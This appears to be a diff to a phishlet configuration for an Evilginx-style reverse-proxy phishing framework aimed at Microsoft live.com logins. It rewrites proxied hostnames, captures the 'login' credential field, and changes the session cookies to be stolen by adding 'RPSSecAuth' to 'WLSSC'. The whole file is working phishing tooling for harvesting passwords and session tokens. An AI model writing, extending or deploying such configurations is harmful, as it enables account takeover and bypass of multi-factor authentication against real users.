@@ -16,7 +16,7 @@ sub_filters:
   - {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
   - domain: '.live.com'
-    keys: ['WLSSC']
+    keys: ['WLSSC','RPSSecAuth']
 credentials:
   username:
     key: 'login'
